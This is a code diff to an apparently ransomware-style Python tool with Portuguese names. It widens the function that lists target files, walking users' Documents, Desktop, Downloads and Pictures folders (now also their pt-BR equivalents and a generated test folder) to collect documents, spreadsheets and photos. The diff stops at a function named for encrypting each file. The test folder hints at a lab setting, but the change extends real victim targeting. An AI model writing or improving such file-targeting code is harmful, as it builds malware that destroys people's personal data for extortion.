@@ -17,13 +17,27 @@ from requests.exceptions import RequestException
 
 def enumerar_arquivos_alvo() -> List[str]:
     home = Path.home()
-    pastas_alvo = ["Documents", "Desktop", "Downloads", "Pictures"]
+
+    # Nomes em EN e PT-BR + pasta de teste gerada pelo generate_test_files.py
+    candidatos = [
+        # Inglês (padrão Ubuntu/Debian fresh install)
+        "Documents", "Desktop", "Downloads", "Pictures",
+        # Português (Linux com locale pt_BR)
+        "Documentos", "Área de Trabalho", "Imagens", "Fotos",
+        # Pasta de teste criada pelo generate_test_files.py
+        "Documentos_Teste",
+    ]
+
     extensoes = {".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg", ".png"}
     resultados: List[str] = []
-    for pasta in pastas_alvo:
-        caminho = home / pasta
-        if not caminho.is_dir():
-            continue
+
+    pastas_encontradas = []
+    for nome_pasta in candidatos:
+        caminho = home / nome_pasta
+        if caminho.is_dir():
+            pastas_encontradas.append(caminho)
+
+    for caminho in pastas_encontradas:
         for raiz, _, arquivos in os.walk(caminho, followlinks=False):
             for nome in arquivos:
                 try:
@@ -32,6 +46,7 @@ def enumerar_arquivos_alvo() -> List[str]:
                         resultados.append(str(caminho_arquivo.resolve()))
                 except (PermissionError, OSError):
                     continue
+
     return resultados
 
 def criptografar_arquivo(caminho_arquivo: str):
